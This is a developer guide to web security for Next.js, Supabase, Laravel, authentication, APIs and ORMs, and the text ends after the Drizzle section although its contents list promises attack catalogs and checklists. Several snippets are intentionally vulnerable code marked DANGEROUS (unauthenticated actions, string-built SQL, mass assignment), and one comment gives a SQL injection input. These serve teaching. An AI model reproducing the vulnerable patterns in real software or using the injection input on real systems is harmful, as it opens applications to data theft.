<p align="center">
  <img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExeHh3MTFhcTEwMjEzazFkcDllcmY5OTA0cmx0NHoxYzZ3ZWQxOWxxZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Z4vRWI5VHNWjS/giphy.gif" width="250" height="250">
</p>

<h1 align="center">WEBSITE_SEC</h1>
<h4 align="center">The Developer's Guide to Web Security</h4>

---

## Table of Contents

1. [Why This Guide Exists](#why-this-guide-exists)
2. [The Modern Stack — Security by Layer](#the-modern-stack--security-by-layer)
3. [Next.js Security](#nextjs-security)
4. [Supabase Security](#supabase-security)
5. [Laravel Security](#laravel-security)
6. [Authentication Done Right](#authentication-done-right)
7. [API & Backend Security](#api--backend-security)
8. [Database Security — Prisma, Drizzle, SQL](#database-security--prisma-drizzle-sql)
9. [Edge, CDN & Serverless Security](#edge-cdn--serverless-security)
10. [WebSocket & Realtime Security](#websocket--realtime-security)
11. [Email Security — SPF, DKIM, DMARC](#email-security--spf-dkim-dmarc)
12. [Payment Security — Stripe, Paddle, Lemon Squeezy](#payment-security--stripe-paddle-lemon-squeezy)
13. [Supply Chain — Dependencies, SBOM, CI/CD](#supply-chain--dependencies-sbom-cicd)
14. [Security Headers & Browser Protections](#security-headers--browser-protections)
15. [Real-World Attack Catalog](#real-world-attack-catalog)
16. [Advanced Attack Catalog](#advanced-attack-catalog)
17. [Monitoring, Logging & Incident Response](#monitoring-logging--incident-response)
18. [Pre-Launch Security Checklist](#pre-launch-security-checklist)

---

## Why This Guide Exists

You're shipping on Vercel. Your database is on Supabase or Neon. Auth is Clerk or Auth.js. You write server actions in Next.js, API routes in Hono, background jobs on Inngest or Trigger.dev. Your stack is fast, modern, and productive.

It's also a **completely new attack surface** that most security guides do not cover. The traditional "use HTTPS and sanitize inputs" advice does not help when you are dealing with RSC payload streaming, Supabase RLS policies, Edge Function injection, or Server Action CSRF.

This guide is written for **developers** — not CISOs, not compliance officers. Every section includes real code you can copy, specific configs you can apply, and attack vectors you need to understand **before** they are used against your application.

---

## The Modern Stack — Security by Layer

```mermaid
flowchart TD
    subgraph L1[" "]
        direction LR
        F_TECH["<b>FRONTEND</b><br/>Next.js · Astro · Remix · SvelteKit · Nuxt · Vite"]
        F_THREAT["<i>Threats</i><br/>XSS · CSRF · Clickjacking<br/>Prototype Pollution · Formjacking<br/>RSC Payload Leak · SSRF via Image"]
    end

    subgraph L2[" "]
        direction LR
        E_TECH["<b>EDGE</b><br/>Vercel Edge · Cloudflare Workers<br/>Supabase Edge Functions"]
        E_THREAT["<i>Threats</i><br/>Request Smuggling · Cache Poisoning<br/>DDoS · Edge Function Injection"]
    end

    subgraph L3[" "]
        direction LR
        A_TECH["<b>AUTH LAYER</b><br/>Clerk · Auth.js · Better Auth<br/>Supabase Auth · Laravel Sanctum<br/>WorkOS · Passkeys"]
        A_THREAT["<i>Threats</i><br/>Credential Stuffing · JWT Confusion<br/>Session Fixation · OAuth Hijack<br/>MFA Fatigue · Token Replay"]
    end

    subgraph L4[" "]
        direction LR
        B_TECH["<b>BACKEND</b><br/>Server Actions · Hono · FastAPI<br/>Laravel · tRPC · GraphQL Yoga<br/>Elysia · Express · Go · Rust"]
        B_THREAT["<i>Threats</i><br/>SQLi · NoSQLi · SSRF<br/>SSTI · Deserialization · IDOR<br/>Command Injection · XXE · Mass Assignment"]
    end

    subgraph L5[" "]
        direction LR
        D_TECH["<b>DATA LAYER</b><br/>Supabase · Neon · PlanetScale · Turso<br/>Upstash Redis · Prisma · Drizzle"]
        D_THREAT["<i>Threats</i><br/>RLS Bypass · Anon Key Abuse<br/>SQLi via Raw Queries<br/>Data Exfiltration · Backup Exposure"]
    end

    subgraph L6[" "]
        direction LR
        I_TECH["<b>INFRASTRUCTURE</b><br/>Vercel · Railway · Fly.io · Render<br/>AWS · Docker · Kubernetes"]
        I_THREAT["<i>Threats</i><br/>Env Var Leak · Source Map Exposure<br/>Open Buckets · IAM Misconfig<br/>Container Escape"]
    end

    L1 --> L2 --> L3 --> L4 --> L5 --> L6
```

Each layer is an independent security boundary. If one fails, the next must hold. The rest of this guide walks through each layer with specific, actionable mitigations.

---

## Next.js Security

### Server Actions — The Double-Edged Sword

Server Actions create invisible POST endpoints that accept serialized arguments from the client. They are powerful and concise — and extremely easy to leave unprotected.

```typescript
// DANGEROUS — no auth, no validation, no rate limit, no ownership check
"use server";
export async function deleteAccount(userId: string) {
  await db.user.delete({ where: { id: userId } });
}
```

An attacker can call this action directly, passing any `userId`, and the server executes it without question. The fix requires four layers:

```typescript
// SAFE — auth, validation, authorization, and rate limiting
"use server";
import { auth } from "@/lib/auth";
import { headers } from "next/headers";
import { z } from "zod";
import { ratelimit } from "@/lib/ratelimit";

const schema = z.object({
  userId: z.string().uuid(),
});

export async function deleteAccount(formData: FormData) {
  // 1. Authenticate — who is calling?
  const session = await auth.api.getSession({
    headers: await headers(),
  });
  if (!session) throw new Error("Unauthorized");

  // 2. Validate — is the input well-formed?
  const { userId } = schema.parse({ userId: formData.get("userId") });

  // 3. Authorize — does the caller own this resource?
  if (session.user.id !== userId) throw new Error("Forbidden");

  // 4. Rate limit — prevent abuse
  const ip = (await headers()).get("x-forwarded-for") ?? "unknown";
  const { success } = await ratelimit.limit(`${ip}:delete-account`);
  if (!success) throw new Error("Too many requests");

  await db.user.delete({ where: { id: userId } });
  revalidatePath("/dashboard");
}
```

**Server Action Security Checklist:**
- [ ] Authenticate inside every action — never assume the client is who it claims to be
- [ ] Validate with Zod, Valibot, or ArkType on every input before any database operation
- [ ] Authorize — an IDOR check (`resource.userId === session.user.id`) on every mutation
- [ ] Rate limit actions that touch authentication, payments, or destructive operations
- [ ] Use `next-safe-action` for typed, validated server actions with composable middleware
- [ ] Keep `"use server"` directives in dedicated action files — never alongside client component code

### Next.js Middleware — Edge-Level Protection

Middleware runs at the Edge before your application code. It is the ideal place for authentication gating, header injection, and geo-blocking.

```typescript
// middleware.ts
import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const ratelimit = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(10, "10 s"),
});

export async function middleware(request: NextRequest) {
  // Rate limit all requests at the edge
  const ip = request.headers.get("x-forwarded-for") ?? "anonymous";
  const { success } = await ratelimit.limit(ip);

  if (!success) {
    return NextResponse.json(
      { error: "Too many requests" },
      { status: 429 }
    );
  }

  const response = NextResponse.next();

  // Security headers on every response
  response.headers.set(
    "Strict-Transport-Security",
    "max-age=63072000; includeSubDomains; preload"
  );
  response.headers.set("X-Content-Type-Options", "nosniff");
  response.headers.set("X-Frame-Options", "DENY");
  response.headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
  response.headers.set(
    "Permissions-Policy",
    "camera=(), microphone=(), geolocation=()"
  );
  response.headers.set(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; font-src 'self'; connect-src 'self'; " +
    "frame-ancestors 'none'; base-uri 'self'; form-action 'self'"
  );

  // Protect admin routes at the edge
  if (request.nextUrl.pathname.startsWith("/admin")) {
    const token = request.cookies.get("session")?.value;
    if (!token) {
      return NextResponse.redirect(new URL("/login", request.url));
    }
  }

  return response;
}

export const config = {
  matcher: "/((?!_next/static|_next/image|favicon.ico).*)",
};
```

### Image Optimization SSRF

Next.js `next/image` fetches and optimizes remote images. If you allow user-supplied URLs, an attacker can make your server fetch internal resources — cloud metadata endpoints, internal APIs, or local files.

```typescript
// next.config.ts
const nextConfig = {
  images: {
    remotePatterns: [
      {
        protocol: "https",
        hostname: "avatars.githubusercontent.com",
      },
      {
        protocol: "https",
        hostname: "lh3.googleusercontent.com",
      },
      {
        protocol: "https",
        hostname: "your-cdn.com",
      },
      // Never allow "*" or accept user-supplied domains directly
    ],
    // Disable serving unoptimized external URLs
    unoptimized: false,
    // Set minimum cache TTL to prevent cache-bombing
    minimumCacheTTL: 60,
  },
};
```

**Additional image hardening:**
- Set `dangerouslyAllowSVG: false` to block SVG-based XSS via image tags
- Set `contentDispositionType: "attachment"` to prevent inline rendering of uploaded content
- Configure `deviceSizes` and `imageSizes` to limit generated variants and prevent resource exhaustion

### React Server Components (RSC) Security

RSC serializes server component output and streams it to the client. Any data you pass as props to a client component becomes part of that serialized payload — visible in the network tab and browser devtools.

```typescript
// DANGEROUS — secret leaks to client via RSC payload
import { ClientProfile } from "./client-profile";

export default async function ProfilePage() {
  const user = await db.user.findUnique({
    where: { id: session.user.id },
    include: { apiKeys: true },  // These will serialize to the client!
  });
  return <ClientProfile user={user} />;
}

// SAFE — only pass what the client needs
export default async function ProfilePage() {
  const user = await db.user.findUnique({
    where: { id: session.user.id },
    select: { name: true, email: true, avatarUrl: true },
  });
  return <ClientProfile name={user.name} email={user.email} avatarUrl={user.avatarUrl} />;
}
```

**RSC hardening rules:**
- Add `"server-only"` as a dependency (`npm install server-only`) and import it in every file that must never run on the client. The build will fail if these files are accidentally imported from client components.
- Use `select` in Prisma/Drizzle queries to return only the fields the client actually needs
- Never pass `session`, `token`, or `apiKey` objects as props to client components
- For sensitive server-side operations, wrap the logic in `import "server-only"` guarded modules

### Route Handler Security

Next.js Route Handlers (`app/api/.../route.ts`) are traditional HTTP endpoints. Unlike Server Actions, they do not benefit from Next.js's built-in CSRF protection via the `Next-Action` header.

```typescript
// app/api/webhooks/stripe/route.ts
import { NextRequest, NextResponse } from "next/server";
import Stripe from "stripe";

const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!);

export async function POST(req: NextRequest) {
  // 1. Verify the request actually came from Stripe
  const signature = req.headers.get("stripe-signature");
  if (!signature) {
    return NextResponse.json({ error: "Missing signature" }, { status: 400 });
  }

  const body = await req.text();
  let event: Stripe.Event;
  try {
    event = stripe.webhooks.constructEvent(
      body,
      signature,
      process.env.STRIPE_WEBHOOK_SECRET!
    );
  } catch {
    return NextResponse.json({ error: "Invalid signature" }, { status: 400 });
  }

  // 2. Process the verified event...
  // Use event.type to handle specific events like checkout.session.completed

  return NextResponse.json({ received: true });
}
```

**Route handler checklist:**
- Validate the `Origin` header for browser-initiated requests
- Verify webhook signatures for all third-party callbacks (Stripe, GitHub, Resend, Clerk)
- Apply `Content-Type` checks — if you expect JSON, reject `multipart/form-data`
- Set a body size limit appropriate to the endpoint

---

## Supabase Security

### Row Level Security (RLS) — The Foundation

RLS is the only enforcement layer between your public `anon` key and your data. It is **off by default on every table**. Enabling it and writing proper policies is the single most impactful security action you can take with Supabase.

```sql
-- Enable RLS on every user-facing table
ALTER TABLE profiles ENABLE ROW LEVEL SECURITY;
ALTER TABLE teams ENABLE ROW LEVEL SECURITY;
ALTER TABLE team_members ENABLE ROW LEVEL SECURITY;
ALTER TABLE api_keys ENABLE ROW LEVEL SECURITY;

-- Profiles: user owns their own row
CREATE POLICY "Users can view own profile"
ON profiles FOR SELECT
USING (auth.uid() = user_id);

CREATE POLICY "Users can update own profile"
ON profiles FOR UPDATE
USING (auth.uid() = user_id)
WITH CHECK (auth.uid() = user_id);

-- Teams: members can read their teams
CREATE POLICY "Team members can view teams"
ON teams FOR SELECT
USING (
  EXISTS (
    SELECT 1 FROM team_members
    WHERE team_members.team_id = teams.id
    AND team_members.user_id = auth.uid()
  )
);

-- Team members: only team admins can add members
CREATE POLICY "Team admins can add members"
ON team_members FOR INSERT
WITH CHECK (
  EXISTS (
    SELECT 1 FROM team_members AS tm
    WHERE tm.team_id = team_members.team_id
    AND tm.user_id = auth.uid()
    AND tm.role = 'admin'
  )
);

-- API keys: user can only see and manage their own keys
CREATE POLICY "Users manage own API keys"
ON api_keys FOR ALL
USING (auth.uid() = user_id)
WITH CHECK (auth.uid() = user_id);

-- Prevent public access entirely on sensitive tables
ALTER TABLE api_keys FORCE ROW LEVEL SECURITY;
REVOKE ALL ON api_keys FROM anon, authenticated;
GRANT SELECT, INSERT, UPDATE, DELETE ON api_keys TO authenticated;
```

**Testing RLS policies:**

```sql
-- Test as a specific user
SELECT set_config('request.jwt.claims', '{"sub":"user-uuid-here","role":"authenticated"}', false);
SELECT * FROM profiles;  -- Should only return that user's profiles

-- Audit all policies
SELECT schemaname, tablename, policyname, cmd, qual, with_check
FROM pg_policies
WHERE schemaname = 'public'
ORDER BY tablename, cmd;

-- Verify RLS is enabled on all tables
SELECT tablename, rowsecurity
FROM pg_tables
WHERE schemaname = 'public'
AND tablename NOT LIKE '_prisma%';
```

### Anon Key — Public, but Not Unrestricted

Your `anon` key ships in the client bundle and is visible to anyone who inspects your JavaScript. RLS is the only protection. The moment a table has RLS disabled, an attacker with your anon key can read every row, write arbitrary data, or delete tables — depending on the granted privileges.

```typescript
// This runs with the anon key — RLS MUST be in place
const { data } = await supabase
  .from("profiles")
  .select("*");
// If RLS is off, the attacker sees EVERY profile in the table
```

**Service role key rules:**
- Never import or reference the `service_role` key in client-side code — it bypasses RLS entirely
- Use `service_role` only in server-side contexts: API routes, Server Actions, Edge Functions, background jobs
- When building admin features, do not expose `service_role`. Instead, create an Edge Function that verifies the caller's admin claim server-side and performs the privileged operation

```typescript
// Edge function pattern for admin operations
// supabase/functions/admin-delete-user/index.ts
Deno.serve(async (req: Request) => {
  const authHeader = req.headers.get("Authorization");
  if (!authHeader) return new Response("Unauthorized", { status: 401 });

  // Verify the caller is an admin using their own JWT
  const supabaseClient = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_ANON_KEY")!,
    { global: { headers: { Authorization: authHeader } } }
  );

  const { data: { user } } = await supabaseClient.auth.getUser();
  if (!user || user.app_metadata?.role !== "admin") {
    return new Response("Forbidden", { status: 403 });
  }

  // Use service_role only AFTER admin verification
  const adminClient = createClient(
    Deno.env.get("SUPABASE_URL")!,
    Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!
  );

  const { userId } = await req.json();
  await adminClient.auth.admin.deleteUser(userId);
  return Response.json({ success: true });
});
```

### Supabase Storage

Storage buckets have their own RLS-like policy system. Files in buckets without policies are accessible to anyone who knows or guesses the URL.

```sql
-- Bucket policies for avatar uploads
CREATE POLICY "Users can upload to their folder"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK (
  bucket_id = 'avatars'
  AND auth.uid()::text = (storage.foldername(name))[1]
);

CREATE POLICY "Users can update their own files"
ON storage.objects FOR UPDATE
TO authenticated
USING (
  bucket_id = 'avatars'
  AND auth.uid()::text = (storage.foldername(name))[1]
);

CREATE POLICY "Users can delete their own files"
ON storage.objects FOR DELETE
TO authenticated
USING (
  bucket_id = 'avatars'
  AND auth.uid()::text = (storage.foldername(name))[1]
);

CREATE POLICY "Avatars are publicly readable"
ON storage.objects FOR SELECT
TO public
USING (bucket_id = 'avatars');
```

**Application-level file validation** (defense in depth — RLS alone is not enough):

```typescript
const MAX_FILE_SIZE = 5 * 1024 * 1024; // 5 MB
const ALLOWED_MIME_TYPES = ["image/jpeg", "image/png", "image/webp"];

async function uploadAvatar(file: File, userId: string) {
  // 1. Size check
  if (file.size > MAX_FILE_SIZE) throw new Error("File too large");

  // 2. MIME type check (can be spoofed — use magic bytes for critical paths)
  if (!ALLOWED_MIME_TYPES.includes(file.type)) {
    throw new Error("Invalid file type");
  }

  // 3. Magic byte verification (cannot be spoofed by the client)
  const buffer = Buffer.from(await file.arrayBuffer());
  const magic = buffer.subarray(0, 4).toString("hex");
  const validMagic: Record<string, string[]> = {
    "image/jpeg": ["ffd8ff"],
    "image/png": ["89504e47"],
    "image/webp": ["52494646"],
  };
  const expected = validMagic[file.type];
  if (!expected?.some((prefix) => magic.startsWith(prefix))) {
    throw new Error("File content does not match declared type");
  }

  // 4. Random filename — prevents path traversal and overwrite attacks
  const extension = file.type.split("/")[1];
  const path = `${userId}/${crypto.randomUUID()}.${extension}`;

  const { error } = await supabase.storage
    .from("avatars")
    .upload(path, file, {
      cacheControl: "3600",
      upsert: false,
      contentType: file.type,
    });

  if (error) throw error;
}
```

### Supabase Realtime

Realtime uses PostgreSQL's logical replication to broadcast changes over WebSockets. **Realtime respects RLS.** If a table has RLS policies, Realtime broadcasts follow those same policies — users only receive changes they are authorized to see.

```typescript
// Client subscribes to changes on their own data
const channel = supabase
  .channel("my-projects")
  .on(
    "postgres_changes",
    {
      event: "*",
      schema: "public",
      table: "projects",
      filter: `user_id=eq.${session.user.id}`,  // Client-side filter
    },
    (payload) => {
      console.log("Change received:", payload);
    }
  )
  .subscribe();
```

**Realtime security checklist:**
- Ensure RLS policies cover all events (`SELECT`, `INSERT`, `UPDATE`, `DELETE`)
- Enable Realtime only on tables that need it — `ALTER TABLE sensitive_data SET (supabase_realtime = false);`
- The client-side filter is a convenience, not security. RLS is the enforcement layer.
- Monitor Realtime connection counts — each subscription opens a WebSocket and a database connection

### Supabase Auth — Custom Claims and Metadata

Store authorization data (roles, plan tiers, permissions) in `raw_app_meta_data` or `raw_user_meta_data`. These are embedded in the user's JWT and available to RLS policies and Edge Functions.

```sql
-- Example: RLS policy that checks a custom claim
CREATE POLICY "Pro users can export data"
ON exports FOR INSERT
WITH CHECK (
  auth.jwt() ->> 'plan' = 'pro'
  AND auth.uid() = user_id
);
```

Set claims server-side using the service role key:

```typescript
// In an Edge Function or API route (service_role only)
await adminClient.auth.admin.updateUserById(userId, {
  app_metadata: { role: "admin", plan: "pro" },
});
```

---

## Laravel Security

### Mass Assignment Protection

Laravel requires you to explicitly declare which model attributes are fillable. If you bypass this — for example, by passing `$request->all()` directly to `update()` — an attacker can set any column, including `role`, `is_admin`, or `balance`.

```php
// DANGEROUS — attacker sends { "role": "admin" } and it gets saved
public function update(Request $request, User $user)
{
    $user->update($request->all());
}

// SAFE — only validated and declared fields are filled
public function update(UpdateUserRequest $request, User $user)
{
    $user->update($request->validated());
}

class UpdateUserRequest extends FormRequest
{
    public function rules(): array
    {
        return [
            'name'  => ['required', 'string', 'max:255'],
            'email' => ['required', 'email', 'unique:users,email,' . $this->user->id],
            // 'role' intentionally excluded — cannot be mass assigned
        ];
    }
}

// Model definition
class User extends Authenticatable
{
    // Allowlist approach (preferred)
    protected $fillable = ['name', 'email', 'avatar_url', 'timezone'];

    // Blocklist approach (less safe — new columns are automatically fillable)
    // protected $guarded = ['id', 'role', 'password', 'remember_token'];
}
```

### Eloquent — SQL Injection Still Possible

Eloquent's query builder uses parameterized queries and is safe from SQL injection. Raw queries and dynamic identifiers (column names, table names, `ORDER BY` clauses) are not.

```php
// SAFE — Eloquent automatically parameterizes
User::where('email', $request->email)->first();

// DANGEROUS — string interpolation in raw queries is injectable
$users = DB::select("SELECT * FROM users WHERE email = '" . $request->email . "'");

// SAFE — parameterized raw query
$users = DB::select(
    "SELECT * FROM users WHERE email = :email",
    ['email' => $request->email]
);

// DANGEROUS — dynamic table/column names cannot be parameterized
// NEVER: DB::table($request->table)->get();

// SAFE — allowlist dynamic identifiers
$allowedTables = ['users', 'posts', 'comments', 'projects'];
if (!in_array($request->table, $allowedTables, true)) {
    abort(403, 'Invalid table');
}
DB::table($request->table)->get();

$allowedColumns = ['name', 'email', 'created_at'];
if (!in_array($request->sort, $allowedColumns, true)) {
    abort(400, 'Invalid sort column');
}
$direction = $request->direction === 'desc' ? 'DESC' : 'ASC';
User::orderBy($request->sort, $direction)->get();
```

### Laravel Sanctum (SPA Authentication)

```php
// config/sanctum.php
return [
    'stateful' => explode(',', env(
        'SANCTUM_STATEFUL_DOMAINS',
        sprintf('%s%s', parse_url(env('APP_URL'), PHP_URL_HOST), '')
    )),
    'guard' => ['web'],
    'expiration' => 60 * 24,  // 24 hours — always set an expiration
    'token_prefix' => env('SANCTUM_TOKEN_PREFIX', ''),
    'middleware' => [
        'authenticate_session' => Laravel\Sanctum\Http\Middleware\AuthenticateSession::class,
        'encrypt_cookies'      => App\Http\Middleware\EncryptCookies::class,
        'verify_csrf_token'    => App\Http\Middleware\VerifyCsrfToken::class,
    ],
];

// .env
SESSION_DRIVER=redis             # Redis or database — never "file" in production
SESSION_LIFETIME=120             # Absolute session timeout in minutes
SESSION_SECURE_COOKIE=true       # HTTPS only
SESSION_HTTP_ONLY=true           # Inaccessible to JavaScript
SESSION_SAME_SITE=lax            # Anti-CSRF
SESSION_DOMAIN=.yourapp.com      # Restrict to your domain
```

### Laravel Signed URLs

For actions that should only be triggered by the intended recipient (email verification, passwordless login, one-click unsubscribe), use signed URLs:

```php
use Illuminate\Support\Facades\URL;

// Generate a signed URL that expires in 60 minutes
$url = URL::temporarySignedRoute(
    'unsubscribe',
    now()->addMinutes(60),
    ['user' => $user->id, 'list' => $listId]
);

// Verify in the route
Route::get('/unsubscribe/{user}/{list}', function (Request $request) {
    if (!$request->hasValidSignature()) {
        abort(401, 'Invalid or expired link');
    }
    // Proceed with unsubscribe
})->name('unsubscribe');
```

### Laravel Encryption

Laravel encrypts cookies and session data automatically. For encrypting arbitrary data:

```php
use Illuminate\Support\Facades\Crypt;

$encrypted = Crypt::encryptString($sensitiveValue);
$decrypted = Crypt::decryptString($encrypted);
```

The encryption key in `APP_KEY` is the master key. Rotating it invalidates all existing encrypted data — plan rotation carefully and re-encrypt data when you change it.

---

## Authentication Done Right

### Choosing an Auth Provider

| Solution | Best For | Watch Out |
|----------|----------|-----------|
| **Clerk** | Next.js, React — drop-in with prebuilt UI components | Vendor lock-in; custom JWT claims require Pro plan; sessions managed externally |
| **Auth.js v5** | Framework-agnostic, self-hosted, full control | You own the user table; more initial setup; magic links need a transactional email provider |
| **Better Auth** | Modern, type-safe, self-hosted alternative | Newer ecosystem; smaller community than Auth.js |
| **Supabase Auth** | Already using Supabase for everything else | GoTrue is GoTrue — custom flows need Edge Functions; limited OAuth providers on free tier |
| **Laravel Fortify + Sanctum** | Laravel applications | PHP-only; SPA authentication requires Sanctum setup and CSRF token management |
| **WorkOS / Stytch** | Enterprise SSO, SAML, SCIM, passkeys | Paid tiers; significant overkill for consumer or small business apps |

### Password Hashing — Argon2id

Argon2id is memory-hard and resistant to GPU, ASIC, and side-channel attacks. It is the OWASP-recommended algorithm and should be your default.

```typescript
// Node.js with @node-rs/argon2
import { hash, verify } from "@node-rs/argon2";

const hashed = await hash(password, {
  memoryCost: 65536,    // 64 MiB
  timeCost: 3,          // 3 iterations
  outputLen: 32,        // 32-byte output
  parallelism: 4,       // 4 threads
  algorithm: 2,         // Argon2id (0 = Argon2d, 1 = Argon2i, 2 = Argon2id)
});

const isValid = await verify(hashed, password);
```

```php
// Laravel config/hashing.php — defaults to Argon2id
'driver' => 'argon2id',
'argon' => [
    'memory'  => 65536,
    'threads' => 4,
    'time'    => 3,
],
```

```python
# Python with argon2-cffi
from argon2 import PasswordHasher
ph = PasswordHasher(memory_cost=65536, time_cost=3, parallelism=4, hash_len=32)
hashed = ph.hash(password)
ph.verify(hashed, password)
```

**Why not bcrypt?** Bcrypt is still acceptable (cost factor 12+), but its 72-byte input limit and weaker GPU resistance make Argon2id the stronger choice.

### Passkeys (FIDO2 / WebAuthn)

Passkeys use public-key cryptography bound to the origin (domain). They are phishing-resistant by design — the browser will only sign a challenge for the exact domain that created the credential.

```typescript
// Server-side: SimpleWebAuthn
import {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse,
} from "@simplewebauthn/server";

// Clerk, Auth.js, WorkOS, and Stytch all support passkeys with minimal configuration.
// If self-hosting, SimpleWebAuthn is the standard library.
```

Passkeys are no longer experimental or niche. Every major platform — iOS, Android, macOS, Windows, ChromeOS — supports cross-device passkey synchronization. A user who authenticates with a passkey cannot be phished by a lookalike domain.

### OAuth 2.1 Changes

- **PKCE is mandatory** for all flows — the Implicit Grant is fully deprecated. Even confidential clients must use PKCE.
- **Refresh token rotation** — each use of a refresh token issues a new one and invalidates the old. Reuse detection indicates token theft.
- **Client authentication** — prefer `private_key_jwt` over shared `client_secret` for confidential clients.

### Rate Limiting Auth Endpoints

```typescript
// Upstash Ratelimit on Vercel Edge
import { Ratelimit } from "@upstash/ratelimit";
import { Redis } from "@upstash/redis";

const loginLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(5, "1 m"),   // 5 attempts per minute
  analytics: true,
  prefix: "ratelimit:login",
});

const passwordResetLimiter = new Ratelimit({
  redis: Redis.fromEnv(),
  limiter: Ratelimit.slidingWindow(2, "15 m"),   // 2 attempts per 15 minutes
  prefix: "ratelimit:reset",
});

export async function login(req: NextRequest) {
  const identifier = req.headers.get("x-forwarded-for") ?? "unknown";
  const { success, limit, reset, remaining } = await loginLimiter.limit(identifier);

  if (!success) {
    return NextResponse.json(
      { error: "Rate limit exceeded. Try again later." },
      {
        status: 429,
        headers: {
          "X-RateLimit-Limit": limit.toString(),
          "X-RateLimit-Remaining": remaining.toString(),
          "X-RateLimit-Reset": reset.toString(),
          "Retry-After": Math.ceil((reset - Date.now()) / 1000).toString(),
        },
      }
    );
  }
  // Proceed with authentication...
}
```

### Password Breach Detection

Check passwords against the Have I Been Pwned API at registration and password change. The k-anonymity model sends only the first 5 characters of the SHA-1 hash — the full password never leaves your server.

```typescript
import { createHash } from "node:crypto";

async function isPasswordPwned(password: string): Promise<boolean> {
  const hash = createHash("sha1").update(password).digest("hex").toUpperCase();
  const prefix = hash.slice(0, 5);
  const suffix = hash.slice(5);

  const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`, {
    headers: { "Add-Padding": "true" },  // Privacy: pads response to obscure exact hash
  });
  const body = await response.text();
  return body.includes(suffix);
}
```

---

## API & Backend Security

### tRPC

tRPC gives you end-to-end type safety, but it does not give you authorization. You must implement that in your procedures or middleware.

```typescript
import { z } from "zod";
import { createTRPCRouter, protectedProcedure, adminProcedure } from "../trpc";

export const userRouter = createTRPCRouter({
  updateProfile: protectedProcedure
    .input(z.object({
      name: z.string().min(1).max(100),
      bio: z.string().max(500).optional(),
    }))
    .mutation(async ({ ctx, input }) => {
      // ctx.session is populated by protectedProcedure middleware
      return ctx.db.user.update({
        where: { id: ctx.session.user.id },
        data: input,
      });
    }),

  deleteUser: adminProcedure
    .input(z.object({ userId: z.string().uuid() }))
    .mutation(async ({ ctx, input }) => {
      // adminProcedure middleware already verified role === "admin"
      return ctx.db.user.delete({ where: { id: input.userId } });
    }),
});
```

### Hono — Lightweight Edge Framework

```typescript
import { Hono } from "hono";
import { cors } from "hono/cors";
import { csrf } from "hono/csrf";
import { secureHeaders } from "hono/secure-headers";
import { jwt } from "hono/jwt";
import { z } from "zod";
import { zValidator } from "@hono/zod-validator";

const app = new Hono();

// Global security middleware
app.use("*", secureHeaders());
app.use("*", csrf({ origin: "https://yourapp.com" }));
app.use("*", cors({
  origin: ["https://yourapp.com"],
  credentials: true,
  allowMethods: ["GET", "POST", "PUT", "DELETE"],
  allowHeaders: ["Content-Type", "Authorization"],
  maxAge: 86400,
}));

// Input validation on every route
const updateUserSchema = z.object({
  name: z.string().min(1).max(100),
  email: z.string().email(),
});

app.put("/api/users/:id",
  jwt({ secret: process.env.JWT_SECRET! }),
  zValidator("json", updateUserSchema),
  async (c) => {
    const payload = c.get("jwtPayload");
    const userId = c.req.param("id");

    // IDOR check
    if (payload.sub !== userId) {
      return c.json({ error: "Forbidden" }, 403);
    }

    const body = c.req.valid("json");
    // body is fully typed and validated
    return c.json({ success: true });
  }
);
```

### GraphQL (Yoga / Apollo)

```typescript
import { createYoga } from "graphql-yoga";
import { useDepthLimit } from "@envelop/depth-limit";
import { usePersistedOperations } from "@envelop/persisted-operations";
import { useRateLimiter } from "@envelop/rate-limiter";

const yoga = createYoga({
  schema,
  plugins: [
    useDepthLimit({ maxDepth: 5 }),
    usePersistedOperations({
      allowArbitraryOperations: process.env.NODE_ENV !== "production",
    }),
    useRateLimiter({
      identifyContext: (ctx) => ctx.request.ip ?? "anonymous",
    }),
  ],
  // Never leak stack traces in production
  maskedErrors: {
    maskError: (error) => {
      if (error instanceof GraphQLError) {
        return error;  // Intentional GraphQL errors pass through
      }
      return new GraphQLError("Internal server error");
    },
  },
});

// Disable introspection in production
if (process.env.NODE_ENV === "production") {
  yoga.introspection = false;
}
```

### General API Hardening Rules

1. **Deny by default.** Every endpoint requires authentication unless explicitly marked public. Use middleware, not per-route checks.
2. **Validate schemas.** Every input — query params, path params, headers, body — gets validated against a strict schema. Unknown fields are rejected.
3. **Set body size limits.** `express.json({ limit: "100kb" })` or equivalent for your framework.
4. **Return consistent error shapes.** Never expose stack traces, database errors, or internal paths in production error responses.
5. **Log every auth failure and 403.** These are your earliest signals of an attack.

---

## Database Security — Prisma, Drizzle, SQL

### Prisma — The Raw Query Trap

```typescript
// SAFE — Prisma's typed queries use parameterized SQL internally
const user = await prisma.user.findUnique({
  where: { email: userInput },
});

// DANGEROUS — $queryRawUnsafe with interpolation is injectable
// An attacker providing ' OR '1'='1' --  would see every user
await prisma.$queryRawUnsafe(`SELECT * FROM users WHERE email = '${email}'`);

// SAFE — $queryRaw with template literals uses parameterized queries
await prisma.$queryRaw`
  SELECT * FROM users WHERE email = ${email}
`;

// SAFE — Dynamic sorting/ordering via allowlist
const ALLOWED_COLUMNS = ["name", "email", "createdAt"] as const;
const ALLOWED_DIRECTIONS = ["asc", "desc"] as const;

if (!ALLOWED_COLUMNS.includes(sortBy as any)) throw new Error("Invalid sort column");
if (!ALLOWED_DIRECTIONS.includes(order as any)) throw new Error("Invalid sort direction");

const users = await prisma.$queryRawUnsafe(
  `SELECT * FROM users ORDER BY "${sortBy}" ${order.toUpperCase()}`
);
// Safe because sortBy and order were validated against an allowlist before interpolation
```

### Drizzle

```typescript
// SAFE — Drizzle's query builder is safe
const user = await db.select().from(users).where(eq(users.email, email));

